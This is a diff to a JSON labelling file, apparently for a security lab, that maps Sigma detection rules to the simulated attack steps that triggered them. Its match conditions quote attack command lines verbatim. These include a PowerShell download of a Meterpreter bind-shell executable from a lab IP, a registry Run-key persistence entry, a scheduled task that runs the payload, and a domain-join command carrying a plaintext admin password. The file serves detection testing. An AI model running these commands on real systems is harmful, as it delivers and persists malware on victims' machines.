@@ -1,24 +1,145 @@
 {
   "_top_level_comment": "this json contains entries for all sigma hits observed during testing",
 
-  "some_rule_id": {
-    "_comment": "explain how the rule works idk",
-    "_rule": "actual rule name",
-    "key.to.look.for": "should contain this important string",
-    "another.key": 1337
+  "Cleartext Protocol Usage": {
+    "_link": "https://github.com/SigmaHQ/sigma/blob/0.22/rules/compliance/netflow_cleartext_protocols.yml",
+    "_true_hits": [
+      "Communication of the meterpreter .exe with the attacker | EmailAttackEXE",
+      "Communication of the meterpreter .exe with the attacker | TakeScreenshotAttack",
+      "Communication of the meterpreter .exe with the attacker | C2ExfiltrationAttack",
+      "Communication of the meterpreter .exe with the attacker | MimikatzAttack"
+    ],
+    "_false_hits": [
+      "OneDrive"
+    ],
+    "conditions": {
+      "entry1": [
+        "document.data.process.name",
+        "Bank-of-Nuthington.exe"
+      ],
+      "entry2": [
+        "document.data.destination.ip",
+        "172.18.1.1"
+      ]
+    }
   },
 
-  "another_rule_id": {
-    "_comment": "if you like",
-    "_rule": "pina",
-    "key.to.look.for": "colada",
-    "another.key": 420
+
+  "Conhost Parent Process Executions": {
+    "_link": "https://github.com/SigmaHQ/sigma/blob/0.22/rules/windows/process_creation/proc_creation_win_susp_conhost.yml",
+    "_true_hits": [
+      "Command to download malware | DownloadMalwareAttack",
+      "Command to change registry for autostart | SetAutostartAttack",
+      "Command to run malware via schtask | ExecuteMalwareAttack"
+    ],
+    "_false_hits": [
+      "None observed"
+    ],
+    "conditions": {
+      "entry1": [
+        "document.data.process.command_line",
+        "c:\\windows\\system32\\cmd.exe /c cmd /C powershell -Command $c = new-object System.Net.WebClient; $c.DownloadFile(\\\"http://172.18.1.1/meterpreter_bind_tcp.exe\\\", \\\"C:\\Windows\\meterpreter_bind_tcp.exe\\\")"
+      ],
+      "entry2": [
+        "document.data.process.command_line",
+        "c:\\windows\\system32\\cmd.exe /c REG ADD HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v \"Meterpreter Bind TCP\" /t REG_SZ /d meterpreter_bind_tcp.exe /f"
+      ],
+      "entry3": [
+        "document.data.process.command_line",
+        "c:\\windows\\system32\\cmd.exe /c if exist C:\\Windows\\meterpreter_bind_tcp.exe (schtasks /create /sc once /st 23:59 /tn tag_bff33 /tr C:\\Windows\\meterpreter_bind_tcp.exe /ru BREACH\\client1"
+      ]
+    }
   },
 
-  "7e4bfe58-4a47-4709-828d-d86c78b7cc1f": {
-    "_name": "Cleartext Protocol Usage",
-    "_link": "https://github.com/SigmaHQ/sigma/blob/0.21/rules/compliance/netflow_cleartext_protocols.yml",
-    "_comment": "Label can easily break if we ever change the name of that executable",
-    "document.data.process.name": "Bank-of-Nuthington.exe"
+
+  "Creation of an Executable by an Executable": {
+    "_link": "https://github.com/SigmaHQ/sigma/blob/0.22/rules/windows/file_event/file_event_win_susp_dropper.yml",
+    "_true_hits": [
+      "Creation of Bank-of-Nuthington.exe by python.exe (userbehavior) | EmailEXEAttack",
+      "Creation of meterpreter_bind_tcp.exe by powershell.exe | DownloadMalwareAttack"
+    ],
+    "_false_hits": [
+      "OneDrive*.exe and derived processes"
+    ],
+    "conditions": {
+      "entry1": [
+        "document.data.file.name",
+        "Bank-of-Nuthington.exe"
+      ],
+      "entry2": [
+        "document.data.file.name",
+        "meterpreter_bind_tcp.exe"
+      ]
+    }
+  },
+
+
+  "Direct Autorun Keys Modification": {
+    "_link": "https://github.com/SigmaHQ/sigma/blob/0.22/rules/windows/process_creation/proc_creation_win_susp_direct_asep_reg_keys_modification.yml",
+    "_true_hits": [
+      "Manipulating registry to enable autostart of malicious .exe | SetAutostartAttack"
+    ],
+    "_false_hits": [
+      "None observed"
+    ],
+    "conditions": {
+      "entry1": [
+        "document.data.process.command_line",
+        "REG  ADD HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v \"Meterpreter Bind TCP\" /t REG_SZ /d meterpreter_bind_tcp.exe /f"
+      ]
+    }
+  },
+
+
+  "DLL Load By System Process From Suspicious Locations": {
+    "_link": "https://github.com/SigmaHQ/sigma/blob/0.22/rules/windows/image_load/image_load_susp_dll_load_system_process.yml",
+    "_true_hits": [
+      "None observed"
+    ],
+    "_false_hits": [
+      "Desktop.ini created by setup process, executed on startup",
+      "__PSScriptPolicyTest_*.*.ps1",
+      "cleanmgr.exe"
+    ],
+    "conditions": {}
+  },
+
+
+  "Encoded PowerShell Command Line Usage of ConvertTo-SecureString": {
+    "_link": "https://github.com/SigmaHQ/sigma/blob/0.22/rules/windows/process_creation/proc_creation_win_powershell_cmdline_convertto_securestring.yml",
+    "_true_hits": [
+      "Hashdump or Mimikatz???"
+    ],
+    "_false_hits": [
+      "None observed"
+    ],
+    "conditions": {
+      "entry1": [
+        "document.data.process.command_line",
+        "powershell \"$admin_secpwd = ConvertTo-SecureString 'breach' -AsPlainText -Force; $credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList 'BREACH\\Administrator', $admin_secpwd; Add-Computer -Credential $credential -DomainName 'BREACH' -Restart -Force\""
+      ]
+    }
+  },
+
+
+  "sigma_rule_name": {
+    "_link": "link_to_rule_in_repo",
+    "_true_hits": [
+      "triggering_action_and_attack_name1",
+      "triggering_action_and_attack_name2"
+    ],
+    "_false_hits": [
+      "possible_false_hits"
+    ],
+    "conditions": {
+      "entry1": [
+        "document.data.relevant_key1",
+        "relevant_content1"
+      ],
+      "entry2": [
+        "document.data.relevant_key2",
+        "relevant_content2"
+      ]
+    }
   }
 }
